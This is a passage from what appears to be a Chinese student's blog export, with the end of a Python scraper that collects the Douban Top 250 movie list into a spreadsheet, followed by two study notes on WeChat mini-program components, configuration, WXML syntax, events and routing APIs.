class&#x3D;&quot;&quot;&gt;(.*?)&lt;&#x2F;p&gt;&#39;,re.S)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#爬取网页</span><br><span class="line">def getData(url):</span><br><span class="line">    datalist&#x3D;[]</span><br><span class="line">    for i in range(0,10): #调用10次</span><br><span class="line">        url1&#x3D;url+str(i*25)</span><br><span class="line">        html&#x3D;getURL(url1)</span><br><span class="line"></span><br><span class="line">        #2.逐一解析数据,边爬边解析</span><br><span class="line">        soup&#x3D;BeautifulSoup(html,&quot;html.parser&quot;)</span><br><span class="line">        for item in soup.find_all(&quot;div&quot;,class_&#x3D;&quot;item&quot;): #查找符合要求的字符串，形成列表</span><br><span class="line">            #print(item) #测试，查看电影item信息</span><br><span class="line">            data&#x3D;[] #保存一部电影的所有信息</span><br><span class="line">            item&#x3D;str(item)</span><br><span class="line"></span><br><span class="line">            #电影链接：</span><br><span class="line">            link&#x3D;re.findall(findlink,item)[0] #通过正则表达式查找指定字符串</span><br><span class="line">            data.append(link) #添加电影链接</span><br><span class="line">            imgSrc&#x3D;re.findall(findImgSrc,item)[0]</span><br><span class="line">            data.append(imgSrc) #添加图片链接</span><br><span class="line">            titles&#x3D;re.findall(findTitle,item) #片名可能只有一个中文名，没有外国名</span><br><span class="line">            if len(titles)&#x3D;&#x3D;2:</span><br><span class="line">                ctitle&#x3D;titles[0]</span><br><span class="line">                data.append(ctitle) #添加中文名</span><br><span class="line">                otitle&#x3D;titles[1].replace(&quot;&#x2F;&quot;,&quot;&quot;) #去掉无关符号</span><br><span class="line">                data.append(otitle) #添加外国名</span><br><span class="line">            else:</span><br><span class="line">                data.append(titles[0])</span><br><span class="line">                data.append(&quot; &quot;) #外国名字留空</span><br><span class="line">            rating&#x3D;re.findall(findRating,item)[0]</span><br><span class="line">            data.append(rating) #添加评分</span><br><span class="line">            judgeNum&#x3D;re.findall(findJudge,item)[0]</span><br><span class="line">            data.append(judgeNum) #添加评价人数</span><br><span class="line">            inq&#x3D;re.findall(findInt,item)</span><br><span class="line">            if len(inq)!&#x3D;0:</span><br><span class="line">                inq&#x3D;inq[0].replace(&quot;。&quot;,&#39;&#39;) #去掉句号</span><br><span class="line">                data.append(inq) #添加寓意</span><br><span class="line">            else:</span><br><span class="line">                data.append(&quot; &quot;) #留空</span><br><span class="line">            bd&#x3D;re.findall(findBd,item)[0]</span><br><span class="line">            bd&#x3D;re.sub(&quot;&lt;br(\s)?&#x2F;&gt;(\s+)?&quot;,&quot; &quot;,bd) #替换&lt;br&#x2F;&gt;</span><br><span class="line">            bd&#x3D;re.sub(&quot;&#x2F;&quot;,&quot; &quot;,bd) #替换&#x2F;</span><br><span class="line">            data.append(bd.strip()) #去掉前后的空格</span><br><span class="line">            datalist.append(data) #把处理好的一部电影信息放入datalist</span><br><span class="line">    return datalist</span><br><span class="line"></span><br><span class="line">#得到指定URL的网页内容</span><br><span class="line">def getURL(url):</span><br><span class="line">    headers&#x3D;&#123;</span><br><span class="line">        &quot;User-Agent&quot;:&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;83.0.4103.61 Safari&#x2F;537.36&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    html&#x3D;&quot;&quot;</span><br><span class="line">    try:</span><br><span class="line">        res&#x3D;requests.get(url&#x3D;url,headers&#x3D;headers)</span><br><span class="line">        html&#x3D;res.text</span><br><span class="line">        #print(html)</span><br><span class="line">    except requests.HTTPError as err:</span><br><span class="line">        if hasattr(err,&quot;code&quot;):</span><br><span class="line">            print(err.code)</span><br><span class="line">        if hasattr(err,&quot;reason&quot;):</span><br><span class="line">            print(err.reason)</span><br><span class="line">    return html</span><br><span class="line"></span><br><span class="line">#保存数据</span><br><span class="line">def saveData(datalist,savepath):</span><br><span class="line">    print(&quot;[*]开始爬取&quot;)</span><br><span class="line">    book&#x3D;xlwt.Workbook(encoding&#x3D;&quot;utf-8&quot;) #创建workbook对象</span><br><span class="line">    sheet&#x3D;book.add_sheet(&quot;豆瓣电影top250&quot;) #创建工作表</span><br><span class="line">    col&#x3D;(&#39;电影链接&#39;,&#39;图片链接&#39;,&#39;电影中文名&#39;,&#39;电影外国名&#39;,&#39;评分&#39;,&#39;评价人数&#39;,&#39;寓意&#39;,&#39;相关信息&#39;)</span><br><span class="line">    for i in range(len(col)):</span><br><span class="line">        sheet.write(0,i,col[i]) #列名</span><br><span class="line">    for i in range(0,250):</span><br><span class="line">        print(&quot;第&#123;&#125;条&quot;.format(i+1))</span><br><span class="line">        data&#x3D;datalist[i]</span><br><span class="line">        for j in range(len(col)):</span><br><span class="line">            sheet.write(i+1,j,data[j])</span><br><span class="line">    book.save(savepath) #保存数据表</span><br><span class="line"></span><br><span class="line">if __name__&#x3D;&#x3D;&quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line">    print(&quot;[*]爬取完毕&quot;)</span><br><span class="line">    #getData(&quot;https:&#x2F;&#x2F;movie.douban.com&#x2F;top250?start&#x3D;&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>程序运行后，在同级目录下生成了一个”豆瓣电影Top250.xls”文件：</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210511085313798.png" alt="image-20210511085313798"></p>
<p>跟着up主做的第一个爬虫，深刻地感受到了爬虫的便利和强大</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bilibili.com/video/BV12E411A7ZQ?t=1236&amp;p=25" target="_blank" rel="noopener">https://www.bilibili.com/video/BV12E411A7ZQ?t=1236&amp;p=25</a></p>
<p><a href="https://blog.csdn.net/lxcnn/article/details/4756030" target="_blank" rel="noopener">https://blog.csdn.net/lxcnn/article/details/4756030</a></p>
]]></content>
      <categories>
        <category>爬虫相关</category>
      </categories>
  </entry>
  <entry>
    <title>微信小程序学习笔记1</title>
    <url>/2021/05/20/wx-small-program1/</url>
    <content><![CDATA[<p>学校的创业学院有学长招人做小程序之类的开发，所以学习一下小程序开发<a id="more"></a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>小程序其实出来很久了吧，我觉得应该每个人都用过，他比较有优势的点就是不占用手机内存，用完即走，像很多app我下完用过一次之后就很少再用了，但是怕以后要用所以没有卸载，这样就一直占用了手机内存，其次他也可以用来引流，微信用户这么多流量肯定也多，像拼多多、小红书就是典型的案例。其他还有很多优势，比如开发成本低、开发门槛低等等。</p>
<p>小程序的主要开发语言是JavaScript，他和开发普通网页有相似性。</p>
<h2 id="开发软件"><a href="#开发软件" class="headerlink" title="开发软件"></a>开发软件</h2><p>使用微信官方的开发者工具，搜索微信小程序api进入官网就能下载</p>
<p><a href="https://developers.weixin.qq.com/miniprogram/dev/devtools/devtools.html" target="_blank" rel="noopener">https://developers.weixin.qq.com/miniprogram/dev/devtools/devtools.html</a></p>
<h3 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h3><p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210519112705523.png" alt="image-20210519112705523"></p>
<p>他除了左边模拟器部分，右边的界面感觉和vscode界面很像</p>
<h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210519114656938.png" alt="image-20210519114656938"></p>
<p>上图可以看到目录结构，他们的作用如下：</p>
<p>pages文件夹里面包含一个个具体的页面，每个具体的页面都要包含四个文件(js、json、wxml、wxss)</p>
<p>utils文件夹存放一些公共文件，比如js、css等等</p>
<p>app.js是程序入口是小程序的逻辑</p>
<p>app.json是当前小程序的全局配置，包括了小程序的所有页面路径、页面表现、网络超时时间、底部tab等等。在pages里新建页面除了在图形化方式新建，还可以在app.json里新建，在他的pages里写一个新的路径ctrl+s保存就会自动在pages文件夹生成该页面文件夹了，因为保存之后软件会自动编译</p>
<p>js页面逻辑</p>
<p>json页面配置</p>
<p>wxss页面样式(类似css)，app.wxss是全局样式，会作用于小程序的所有页面，局部样式page.wxss仅对当前页面生效</p>
<p>wxml页面结构(类似html)</p>
<p>project.config.json项目配置文件，做一些个性化配置，例如界面颜色、编译配置等等</p>
<p>sitemap配置小程序及其页面是否允许被微信索引，相当于网站的robots.txt，规定爬虫爬取范围</p>
<h2 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h2><p>组件相当于html里的标签把，微信小程序有自己的一套标签，可以在官方文档里看</p>
<p><a href="https://developers.weixin.qq.com/miniprogram/dev/component/" target="_blank" rel="noopener">https://developers.weixin.qq.com/miniprogram/dev/component/</a></p>
<p>这里写一下老师讲的基础组件和一些常用属性</p>
<h3 id="view"><a href="#view" class="headerlink" title="view"></a>view</h3><p>view组件相当于div标签，他有四个属性</p>
<p><code>hover-class</code>:按下的样式类</p>
<p><code>hover-stop-propagation</code>:是否阻止本节点的祖先节点出现点击态，默认是false，在标签里加上就相当于true了，这个作用挺大的，可以防止点击子元素父元素也被点了的情况。</p>
<p><code>hover-start-time</code>:按住多久出现点击态，这个默认就好了</p>
<p><code>hover-stay-time</code>:手指松开后点击态保留时间，这个也默认就好了</p>
<h3 id="text"><a href="#text" class="headerlink" title="text"></a>text</h3><p>这个相当于span，存放文本的，他有三个属性</p>
<p><code>user-select</code>:文本是否可选，这个属性会让文本节点显示为inline-block。手机上长按会出现选中文字来复制等等，就是靠他设置的</p>
<p><code>space</code>:显示连续空格</p>
<p><code>decode</code>:是否解码。应该是html编码把，</p>
<h3 id="image"><a href="#image" class="headerlink" title="image"></a>image</h3><p>微信小程序不能大于2M，所以不要像开发网站一样在同级目录下创建images存放图片，最好用远程路径或者云开发，而且要压缩图片</p>
<p><code>src</code>：图片地址</p>
<p><code>mode</code>:图片裁剪、缩放的模式，最常用的是widthFix</p>
<p><code>show-menu-by-longpress</code>:开启长按图片显示识别小程序码菜单</p>
<p>这三个常用，其他的以后再深入把</p>
<h3 id="navigator"><a href="#navigator" class="headerlink" title="navigator"></a>navigator</h3><p>超链接，相当于a标签</p>
<p><code>url</code>:当前小程序内的跳转连接，相当于href</p>
<p><code>open-type</code>:跳转方式</p>
<p>默认值为navigate，保留当前页面，跳转到应用内的某个页面。但是不能跳到 tabbar 页面。</p>
<p>最常用的有reLaunch，关闭所有页面，打开到应用内的某个页面</p>
<h3 id="scroll-view"><a href="#scroll-view" class="headerlink" title="scroll-view"></a>scroll-view</h3><p>可滚动视图区域，滚动在手机上也是常用的，通常配合flex弹性布局来使用，在wxss里加上</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">display:flex;</span><br><span class="line">flex:none;</span><br></pre></td></tr></table></figure>

<p>flex:none，就是flex:0 0 auto的简写，意思是不放大不缩小，项目占据原始大小</p>
<p>横向滚动也可以配合下面代码实现：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.子类名&#123;</span><br><span class="line">  display: inline-block; &#x2F;*行内块元素显示一行*&#x2F;</span><br><span class="line">&#125;</span><br><span class="line">.父类名&#123;</span><br><span class="line">  white-space: nowarp; &#x2F;*超出不换行*&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>scroll-x</code>:允许横向滚动，默认false</p>
<p><code>scroll-y</code>:允许纵向滚动，默认false</p>
<h3 id="swiper-item"><a href="#swiper-item" class="headerlink" title="swiper-item"></a>swiper-item</h3><p>只能放在swiper组件中，宽高自动设置为100%</p>
<p><code>item-id</code>:该swiper-item的标识符</p>
<h3 id="swiper"><a href="#swiper" class="headerlink" title="swiper"></a>swiper</h3><p>滑块视图容器，里面只能放swiper-item组件</p>
<p>通常用来做图片轮播，在wxss里把height设置为rpx单位(可以根据屏幕宽度进行自适应)</p>
<p><code>indicator-dots</code>:是否显示面板指示点，默认为false</p>
<p><code>indicator-color</code>:指示点颜色</p>
<p><code>indicator-active-color</code>:当前选中的指示点颜色</p>
<p><code>autoplay</code>:是否自动切换，默认为false</p>
<p><code>interval</code>:自动切换时间间隔，默认5000ms</p>
<p><code>circular</code>:是否采用衔接滑动，默认为false</p>
<p><code>vertical</code>:滑动方向是否为纵向，默认是横向</p>
<p><code>previous-margin</code>:前边距，可用于露出前一项的一小部分</p>
<p><code>next-margin</code>:后边距，可用于露出前一项的一小部分</p>
<h3 id="button"><a href="#button" class="headerlink" title="button"></a>button</h3><p>按钮组件</p>
<p><code>size</code>:按钮大小，改mini变小</p>
<p><code>type</code>:按钮的样式类型，primary为绿色 default为白色 warn为红色</p>
<p><code>plain</code>:按钮是否镂空，背景色透明。默认为false</p>
<p><code>disabled</code>:是否禁用。默认为false</p>
<p><code>loading</code>:名称前是否带loading图标。默认为false，加载的时候用</p>
<p><code>open-type</code>:微信开放能力。他的功能很强大，可以打开客服会话(contact)、获取用户信息(getUserInfo)、打开app(launchApp)等等</p>
<p><code>form-type</code>:用于form组件，点击分别会触发form组件的submit/reset事件</p>
<h3 id="input"><a href="#input" class="headerlink" title="input"></a>input</h3><p>输入框</p>
<p><code>type</code>:input的类型。text文本输入键盘、number数字输入键盘、idcard身份证输入键盘、digit带小数点的数字键盘</p>
<p><code>placeholder</code>:输入框为空时占位符</p>
<p><code>disabled</code>:是否禁用</p>
<p><code>maxlength</code>:最大输入长度</p>
<p><code>cursor-spacing</code>:指定光标与键盘的距离</p>
<p><code>focus</code>:获取焦点</p>
<p><code>confirm-type</code>:设置键盘右下角按钮的文字(发送、搜索下一个等等)，仅在type=’text’时生效</p>
<h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><p>开关选择器</p>
<p><code>checked</code>:是否选中，默认false</p>
<h3 id="textarea"><a href="#textarea" class="headerlink" title="textarea"></a>textarea</h3><p>多行输入框</p>
<h3 id="icon"><a href="#icon" class="headerlink" title="icon"></a>icon</h3><p>图标组件</p>
<p><code>type</code>:icon的类型，有success、info、search等等很多</p>
<p><code>size</code>:icon的大小</p>
<p><code>color</code>:icon的颜色，同css的color</p>
<h3 id="progress"><a href="#progress" class="headerlink" title="progress"></a>progress</h3><p>进度条</p>
<p><code>percent</code>:百分比0-100</p>
<p><code>show-info</code>:在进度条右侧显示百分比</p>
<h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><h3 id="小程序配置"><a href="#小程序配置" class="headerlink" title="小程序配置"></a>小程序配置</h3><p>参考官方文档</p>
<h4 id="全局配置"><a href="#全局配置" class="headerlink" title="全局配置"></a>全局配置</h4><p>这个之前在目录结构里说过一些，这里再具体看看</p>
<p>pages</p>
<p>用于指定小程序由哪些页面组成，每一项都对应一个页面的 路径（含文件名） 信息。文件名不需要写文件后缀，框架会自动去寻找对应位置的 <code>.json</code>, <code>.js</code>, <code>.wxml</code>, <code>.wxss</code> 四个文件进行处理。未指定 <code>entryPagePath</code> 时，数组的第一项代表小程序的初始页面（首页）。</p>
<p>window</p>
<p>用于设置小程序的状态栏、导航条、标题、窗口背景色。</p>
<p><code>navigationBarBackgroundColor</code>:导航栏背景颜色</p>
<p><code>navigationBarTextStyle</code>:导航栏标题颜色，仅支持black/white</p>
<p><code>navigationBarTitleText</code>:导航栏标题文字内容</p>
<p><code>backgroundColor</code>:窗口的背景色，这个只有再下拉刷新的时候看得见颜色</p>
<p><code>enablePullDownRefresh</code>:是否开启全局的下拉刷新。默认false</p>
<p><code>backgroundTextStyle</code>:下拉loading的样式，仅支持dark/light</p>
<p>tabBar 对象类型，用{ }包裹</p>
<p>如果小程序是一个多 tab 应用（客户端窗口的底部或顶部有 tab 栏可以切换页面），可以通过 tabBar 配置项指定 tab 栏的表现，以及 tab 切换时显示的对应页面。</p>
<p><code>list</code>:tab的列表，最少2个，最多5个tab。数组类型用[ ]包裹</p>
<p>list有四个属性：</p>
<p><code>pagePath</code>:页面路径，必须在pages中先定义。string类型</p>
<p><code>text</code>:tab上按钮文字</p>
<p><code>iconPath</code>:图片路径，icon 大小限制为 40kb，建议尺寸为 81px * 81px，不支持网络图片。当position为top时，不显示 icon。</p>
<p><code>selectedIconPath</code>:选中时的图片路径，icon 大小限制为 40kb，建议尺寸为 81px * 81px，不支持网络图片。当position为top时，不显示 icon。</p>
<p><code>color</code>:tab上的文字默认颜色，仅支持十六进制颜色</p>
<p><code>selectedColor</code>:tab上的文字选中时的颜色，仅支持十六进制颜色</p>
<p><code>backgroundColor</code>:tab的背景色，仅支持十六进制颜色</p>
<p><code>position</code>:tabBar的位置，仅支持bottom/top</p>
<h4 id="页面配置"><a href="#页面配置" class="headerlink" title="页面配置"></a>页面配置</h4><p>每一个小程序页面也可以使用 <code>.json</code> 文件来对本页面的窗口表现进行配置。页面中配置项在当前页面会覆盖 <code>app.json</code> 的 <code>window</code> 中相同的配置项。文件内容为一个 JSON 对象，他的属性和全局配置里的window差不多</p>
<h3 id="WXML语法"><a href="#WXML语法" class="headerlink" title="WXML语法"></a>WXML语法</h3><h4 id="数据绑定"><a href="#数据绑定" class="headerlink" title="数据绑定"></a>数据绑定</h4><p>WXML 中的动态数据均来自对应 Page 的 data。数据绑定用胡子语法(双大括号)将变量包起来，语法和flask框架的变量一样</p>
<p>data里可以放string、array、object。字符串用双引号””包裹，数组用中括号[]包裹，对象用花括号{}包裹</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210519210411325.png" alt="image-20210519210411325"></p>
<p>用的时候，字符串直接用，数组要写索引，对象要写属性</p>
<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210519210424168.png" alt="image-20210519210424168"></p>
<h4 id="条件渲染"><a href="#条件渲染" class="headerlink" title="条件渲染"></a>条件渲染</h4><p>wx:if</p>
<p>在框架中，使用 <code>wx:if=&quot;&quot;</code> 来判断是否需要渲染该代码块，也可以用 <code>wx:elif</code> 和 <code>wx:else</code> 来添加一个 else 块：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;view wx:if&#x3D;&quot;&#123;&#123;length &gt; 5&#125;&#125;&quot;&gt; 1 &lt;&#x2F;view&gt;</span><br><span class="line">&lt;view wx:elif&#x3D;&quot;&#123;&#123;length &gt; 2&#125;&#125;&quot;&gt; 2 &lt;&#x2F;view&gt;</span><br><span class="line">&lt;view wx:else&gt; 3 &lt;&#x2F;view&gt;</span><br></pre></td></tr></table></figure>

<p>如果要写js代码的话，必要要放在{{}}里。</p>
<p>block wx:if</p>
<p>因为 <code>wx:if</code> 是一个控制属性，需要将它添加到一个标签上。如果要一次性判断多个组件标签，可以使用一个 <code>&lt;block/&gt;</code> 标签将多个组件包装起来，并在上边使用 <code>wx:if</code> 控制属性。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;block wx:if&#x3D;&quot;&#123;&#123;true&#125;&#125;&quot;&gt;</span><br><span class="line">  &lt;view&gt; view1 &lt;&#x2F;view&gt;</span><br><span class="line">  &lt;view&gt; view2 &lt;&#x2F;view&gt;</span><br><span class="line">&lt;&#x2F;block&gt;</span><br></pre></td></tr></table></figure>

<p><code>&lt;block/&gt;</code> 并不是一个组件，它仅仅是一个包装元素，不会在页面中做任何渲染，只接受控制属性。</p>
<h4 id="列表渲染"><a href="#列表渲染" class="headerlink" title="列表渲染"></a>列表渲染</h4><p>wx:for</p>
<p>在组件上使用 <code>wx:for</code> 控制属性绑定一个数组，即可使用数组中各项的数据重复渲染该组件。</p>
<p>默认数组的当前项的下标默认为 <code>index</code>，数组当前项的值默认为 <code>item</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;view wx:for&#x3D;&quot;&#123;&#123;[111,222,333,444]&#125;&#125;&quot;&gt;&#123;&#123;index&#125;&#125;、&#123;&#123;item&#125;&#125;&lt;&#x2F;view&gt;</span><br></pre></td></tr></table></figure>

<p>使用 <code>wx:for-item</code> 可以指定数组当前元素的变量名，</p>
<p>使用 <code>wx:for-index</code> 可以指定数组当前下标的变量名：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;view wx:for&#x3D;&quot;&#123;&#123;[1, 2, 3, 4, 5, 6, 7, 8, 9]&#125;&#125;&quot; wx:for-item&#x3D;&quot;i&quot;&gt;</span><br><span class="line">  &lt;view wx:for&#x3D;&quot;&#123;&#123;[1, 2, 3, 4, 5, 6, 7, 8, 9]&#125;&#125;&quot; wx:for-item&#x3D;&quot;j&quot;&gt;</span><br><span class="line">    &lt;view wx:if&#x3D;&quot;&#123;&#123;i &lt;&#x3D; j&#125;&#125;&quot;&gt;</span><br><span class="line">      &#123;&#123;i&#125;&#125; * &#123;&#123;j&#125;&#125; &#x3D; &#123;&#123;i * j&#125;&#125;</span><br><span class="line">    &lt;&#x2F;view&gt;</span><br><span class="line">  &lt;&#x2F;view&gt;</span><br><span class="line">&lt;&#x2F;view&gt;</span><br></pre></td></tr></table></figure>

<p>wx:key</p>
<p>如果列表中项目的位置会动态改变或者有新的项目添加到列表中，并且希望列表中的项目保持自己的特征和状态（如input中的输入内容，switch的选中状态），需要使用 <code>wx:key</code> 来指定列表中项目的唯一的标识符。</p>
<p><code>wx:key</code> 的值以两种形式提供</p>
<p>字符串，代表在 for 循环的 array 中 item 的某个 property，该 property 的值需要是列表中唯一的字符串或数字，且不能动态改变。</p>
<p>保留关键字 <code>*this</code> 代表在 for 循环中的 item 本身，这种表示需要 item 本身是一个唯一的字符串或者数字。</p>
<p>当数据改变触发渲染层重新渲染的时候，会校正带有 key 的组件，框架会确保他们被重新排序，而不是重新创建，以确保使组件保持自身的状态，并且提高列表渲染时的效率。</p>
<p>如不提供 <code>wx:key</code>，会报一个 <code>warning</code>， 如果明确知道该列表是静态，或者不必关注其顺序，可以选择忽略。把它设置成<code>*this</code>或者<code>index</code>就行了。</p>
<p>说实话这里没看懂什么意思，以后碰到再深入看看把</p>
<h3 id="框架接口"><a href="#框架接口" class="headerlink" title="框架接口"></a>框架接口</h3><h4 id="页面"><a href="#页面" class="headerlink" title="页面"></a>页面</h4><p>page</p>
<p>写在js文件里</p>
<p>注册小程序中的一个页面。接受一个 <code>Object</code> 类型参数，其指定页面的初始数据、生命周期回调、事件处理函数等。</p>
<p>生命周期函数,在满足某些条件的情况下,自动触发的事件.</p>
<p>属性：</p>
<p><code>data</code>:页面初始数据</p>
<p><code>onLoad</code>:生命周期回调—监听页面加载</p>
<p><code>onShow</code>:生命周期回调—监听页面显示</p>
<p><code>onReady</code>:生命周期回调—监听页面初次渲染完成</p>
<p><code>onHide</code>:生命周期回调—监听页面隐藏</p>
<p><code>onUnload</code>:生命周期回调—监听页面卸载</p>
<p><code>onPullDownRefresh</code>:监听用户下拉动作</p>
<p><code>onReachBottom</code>:页面上拉触底事件的处理函数</p>
<p><code>onShareAppMessage</code>:用户点击右上角转发</p>
<p>等等还有很多</p>
<h2 id="事件系统"><a href="#事件系统" class="headerlink" title="事件系统"></a>事件系统</h2><p><a href="https://developers.weixin.qq.com/miniprogram/dev/framework/view/wxml/event.html" target="_blank" rel="noopener">https://developers.weixin.qq.com/miniprogram/dev/framework/view/wxml/event.html</a></p>
<h3 id="什么时事件"><a href="#什么时事件" class="headerlink" title="什么时事件"></a>什么时事件</h3><p>事件是视图层到逻辑层的通讯方式。</p>
<p>事件可以将用户的行为反馈到逻辑层进行处理。</p>
<p>事件可以绑定在组件上，当达到触发事件，就会执行逻辑层(js文件)中对应的事件处理函数。</p>
<p>事件对象可以携带额外信息，如 id, dataset, touches。</p>
<h3 id="事件使用"><a href="#事件使用" class="headerlink" title="事件使用"></a>事件使用</h3><p>用bind在组件中绑定一个事件处理函数</p>
<h3 id="事件分类"><a href="#事件分类" class="headerlink" title="事件分类"></a>事件分类</h3><p>冒泡事件：当一个组件上的事件被触发后，该事件会向父节点传递。</p>
<p>非冒泡事件：当一个组件上的事件被触发后，该事件不会向父节点传递。</p>
<p>冒泡事件：</p>
<p><code>tap</code>:手指触摸后马上离开。相当于click</p>
<p><code>touchstart</code>:手指触摸动作开始</p>
<p><code>touchend</code>:手指触摸动作结束</p>
<p>等等</p>
<h3 id="事件对象"><a href="#事件对象" class="headerlink" title="事件对象"></a>事件对象</h3><p>当组件触发事件时，逻辑层绑定该事件的处理函数会收到一个事件对象。</p>
<p>常用的是<code>currentTarget</code>:当前组件的一些属性值集合，他常用的属性是<code>dataset</code>:当前组件上由<code>data-</code>开头的自定义属性组成的集合。</p>
<h3 id="事件处理函数"><a href="#事件处理函数" class="headerlink" title="事件处理函数"></a>事件处理函数</h3><p>首先绑定组件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;view bindtap&#x3D;&quot;mytap&quot; data-title&#x3D;&quot;微信小程序&quot;&gt;&#123;&#123;title&#125;&#125;&lt;&#x2F;view&gt;</span><br></pre></td></tr></table></figure>

<p>在js里面写函数，用this.setData来修改data里的值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data: &#123;</span><br><span class="line">  title:&quot;小程序&quot;</span><br><span class="line">&#125;,</span><br><span class="line">mytap: function(res)&#123;</span><br><span class="line">  var title&#x3D;res.currentTarget.dataset.title;</span><br><span class="line">  this.setData(&#123;</span><br><span class="line">    title:title</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p>如果要获取data里的参数用<code>this.data.title</code></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.bilibili.com/video/BV1WQ4y1T7D8?p=1" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1WQ4y1T7D8?p=1</a></p>
<p><a href="http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html</a></p>
]]></content>
      <categories>
        <category>微信小程序</category>
      </categories>
  </entry>
  <entry>
    <title>微信小程序学习笔记2</title>
    <url>/2021/05/20/wx-small-program2/</url>
    <content><![CDATA[<p>前面学了一些基础组件和框架知识，现在学习API的知识<a id="more"></a></p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>api就是小程序内置的一些方法和事件，只要学会怎么调用就可以了</p>
<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><p><code>wx.getSystemInfoSync</code>:获取系统信息。可以使用他的model属性获取手机型号</p>
<h2 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h2><h3 id="交互"><a href="#交互" class="headerlink" title="交互"></a>交互</h3><p><code>wx.showLoading</code>:显示loading提示框。title属性设置提示的内容。需主动调用wx.hideLoading才能关闭提示框</p>
<p><code>wx.hideLoading</code>:隐藏loading提示框</p>
<p><code>wx.showToast</code>:显示消息提示框。title属性设置提示的内容，icon设置图标</p>
<h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><p><code>wx.navigateTo</code>:保留当前页面，跳转到应用内的某个页面。但是不能跳到 tabbar 页面。导航组件(navigator)默认用的跳转方式就是这个api，所以他不能跳转到tabbar页面，为了点击tabbar后是独立的页面，而不是点击之后还有返回</p>
<p><code>wx.switchTab</code>:跳转到tabBar页面，并关闭其他所有非tabBar页面。设置导航组件(navigator)的<code>open-type</code>为switchTab，这样就调用了这个api，可以跳转到tabBar页面了</p>
<p><code>wx.reLaunch</code>:关闭所有页面，打开到应用内的某个页面。设置导航组件(navigator)的<code>open-type</code>为reLaunch，这样就调用了这个api，可以跳转到tabBar页面了。他和switchTab的很像但是他调用的这个api的url路径可以带参数，所以通常用reLaunch做跳转</p>
<p><code>wx.navigateBack</code>:关闭当前页面，返回上一页面或多级页面。他只能返回用navigateTo来转跳的页面</p>
<p>页面跳转可以用navigator组件，也可以在其他组件上绑定点击事件，然后再js里面写函数调用api来跳转</p>
<h2 id="简单布局"><a href="#简单布局" class="headerlink" title="简单布局"></a>简单布局</h2><p>wxml:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;view class&#x3D;&quot;row&quot; wx:for&#x3D;&quot;&#123;&#123;datalist&#125;&#125;&quot;&gt;</span><br><span class="line">  &lt;view class&#x3D;&quot;pic&quot;&gt;</span><br><span class="line">    &lt;image src&#x3D;&quot;&#123;&#123;item.url&#125;&#125;&quot;&gt;&lt;&#x2F;image&gt;</span><br><span class="line">  &lt;&#x2F;view&gt;</span><br><span class="line">  &lt;view class&#x3D;&quot;text&quot;&gt;</span><br><span class="line">    &lt;view class&#x3D;&quot;title&quot;&gt;&#123;&#123;item.title&#125;&#125;&lt;&#x2F;view&gt;</span><br><span class="line">    &lt;view class&#x3D;&#39;time&#39;&gt;&#123;&#123;item.time&#125;&#125;&lt;&#x2F;view&gt;</span><br><span class="line">  &lt;&#x2F;view&gt;</span><br><span class="line">&lt;&#x2F;view&gt;</span><br></pre></td></tr></table></figure>

<p>js:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data: &#123;</span><br><span class="line">  datalist:[</span><br><span class="line">    &#123;title:&quot;标题1&quot;,time:&quot;2021-5-20&quot;,url:&quot;&#x2F;images&#x2F;1.jpg&quot;&#125;,</span><br><span class="line">    &#123;title:&quot;标题2&quot;,time:&quot;2021-5-21&quot;,url:&quot;&#x2F;images&#x2F;2.jpg&quot;&#125;,</span><br><span class="line">    &#123;title:&quot;标题3&quot;,time:&quot;2021-5-22&quot;,url:&quot;&#x2F;images&#x2F;3.jpg&quot;&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/hollow-heart/typora-image/raw/master/image-20210520105418657.png" alt="image-20210520105418657"></p>
